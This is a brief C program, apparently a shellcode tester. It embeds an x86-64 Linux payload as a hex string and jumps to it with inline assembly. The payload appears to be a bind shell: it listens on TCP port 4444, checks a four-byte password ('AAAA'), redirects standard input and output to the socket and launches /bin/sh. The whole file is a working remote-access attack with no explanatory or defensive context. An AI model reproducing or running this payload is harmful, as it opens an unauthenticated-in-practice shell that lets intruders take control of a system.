#include <stdio.h>
#include <string.h>
 
char shellcode[] = "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\x66\x81\xc2\x11\x5c\x48\xc1\xe2\x10\x66\x83\xc2\x02\x52\x54\x5e\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x48\xff\xc6\x6a\x32\x58\x0f\x05\x54\x5e\x6a\x10\x54\x5a\x6a\x2b\x58\x0f\x05\x48\x83\xc6\x08\x50\x5f\x30\xc0\x6a\x04\x5a\x0f\x05\x81\x3e\x41\x41\x41\x41\x75\x22\x6a\x03\x5e\xff\xce\x6a\x21\x58\x0f\x05\x75\xf7\x99\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x54\x5f\x48\x31\xc0\xb0\x3b\x0f\x05";
 
main(void)
{       
        printf("Shellcode length: %d\n", (int)strlen(shellcode));
 
        __asm__ (        "mov $0xffffffffffffffff, %rax\n\t"
                         "mov %rax, %rbx\n\t"
                         "mov %rax, %rcx\n\t"
                         "mov %rax, %rdx\n\t"
                         "mov %rax, %rsi\n\t"
                         "mov %rax, %rdi\n\t"
                         "mov %rax, %rbp\n\t"
 
                         "call shellcode"       );
}
 
